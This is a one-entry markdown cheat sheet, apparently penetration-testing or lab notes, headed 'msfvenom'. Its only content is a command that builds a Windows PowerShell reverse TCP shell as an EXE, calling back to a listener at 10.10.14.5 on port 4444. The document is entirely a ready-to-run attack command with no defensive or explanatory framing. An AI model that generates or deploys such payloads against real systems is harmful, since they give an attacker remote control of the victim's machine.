# msfvenom

## Windows Powershell Reverse TCP EXE
```
msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe
```
